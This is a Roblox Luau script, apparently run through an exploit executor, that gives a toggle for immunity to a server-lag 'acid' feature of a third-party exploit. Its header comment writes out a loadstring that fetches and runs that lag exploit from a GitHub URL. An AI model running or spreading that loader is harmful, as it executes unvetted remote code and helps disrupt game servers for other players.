--[[

this script makes you immune to the summon acid and summon acid rain feature in the zfucker exploit, meaning it's server lag function won't work on you.
this script is a defense against other users who would use the zfucker exploit script.
for context and for lolz i provided the loadstring for zfucker, meaning you could lag the server and be fine!! you're also a loser for even wanting to lag the server.


 loadstring(request({
    Url = "https://raw.githubusercontent.com/osukfcdays/zlfucker/refs/heads/main/main.luau"
}).Body)()


]]

local CONFIG = {
    ACID_PART_NAME = "Spit"
}


local Workspace: Workspace = game:GetService("Workspace")
local Debris: Debris = game:GetService("Debris")
local CoreGui: CoreGui = game:GetService("CoreGui")

local State = {
    InterceptorConnection = nil,
    IsImmunityActive = false
}

local function toggleAcidInterceptor(enabled: boolean)
    if State.InterceptorConnection then
        State.InterceptorConnection:Disconnect()
        State.InterceptorConnection = nil
    end

    if enabled then
        State.InterceptorConnection = Workspace.ChildAdded:Connect(function(child)
            if child.Name == CONFIG.ACID_PART_NAME then
                Debris:AddItem(child, 0)
            end
        end)
    end
end


local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Sigma_ImmunityShield_" .. math.random(1, 1000)
screenGui.ResetOnSpawn = false

local immunityToggle = Instance.new("TextButton")
immunityToggle.Name = "ImmunityToggleButton"
immunityToggle.Size = UDim2.new(0, 180, 0, 35)
immunityToggle.Position = UDim2.new(0, 20, 0, 20)
immunityToggle.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
immunityToggle.BorderColor3 = Color3.fromRGB(10, 10, 10)
immunityToggle.BorderSizePixel = 2
immunityToggle.Font = Enum.Font.SourceSansBold
immunityToggle.Text = "Acid Immunity: OFF"
immunityToggle.TextColor3 = Color3.fromRGB(225, 225, 225)
immunityToggle.TextSize = 16
immunityToggle.Parent = screenGui

immunityToggle.MouseButton1Click:Connect(function()
    State.IsImmunityActive = not State.IsImmunityActive
    toggleAcidInterceptor(State.IsImmunityActive)
    
    if State.IsImmunityActive then
        immunityToggle.BackgroundColor3 = Color3.fromRGB(40, 150, 90)
        immunityToggle.Text = "Acid Immunity: ON"
        print("Sigma Immunity Shield: ACTIVATED")
    else
        immunityToggle.BackgroundColor3 = Color3.fromRGB(150, 40, 40)
        immunityToggle.Text = "Acid Immunity: OFF"
        print("Sigma Immunity Shield: DEACTIVATED")
    end
end)

screenGui.Parent = CoreGui

screenGui.Destroying:Connect(function()
    if State.InterceptorConnection then
        State.InterceptorConnection:Disconnect()
    end
    print("Sigma Immunity Shield has been removed.")
end)
